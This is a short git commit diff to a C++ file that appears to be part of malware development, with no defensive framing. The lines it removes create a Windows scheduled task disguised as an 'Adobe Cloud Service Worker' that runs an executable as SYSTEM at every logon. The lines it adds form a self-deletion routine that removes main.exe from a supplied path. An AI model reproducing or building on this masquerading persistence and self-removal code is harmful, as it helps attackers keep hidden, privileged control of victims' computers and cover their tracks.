a07e378f9eafdfcc4357ee8776a4c80f42ce9b30
qDread-dev <58754377+qDread-dev@users.noreply.github.com>
2023-10-04 17:27:58 -0400

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,11 +1,14 @@
 #include <iostream>
 #include <string>
+#include <cstring>
 
 int main(int argc, char* argv[]) {
-    std::cout << "Hello world!" << std::endl;
-    std::string test;
-    std::cin >> test;
-    // create a task to delete the program that is argv[1]
-    system("schtasks /create /tn \"Adobe Cloud Service Worker\" /tr \"C:\\Program Files\\Adobe Cloud Service Worker\\main.exe\" /sc onlogon /ru \"SYSTEM\"");
+    // self delete prgrm
+    std::string path = argv[1];
+    path += "\\main.exe";
+    std::cout << path << std::endl;
+    std::remove(path.c_str());
     return 1;
 }
+
+// brb
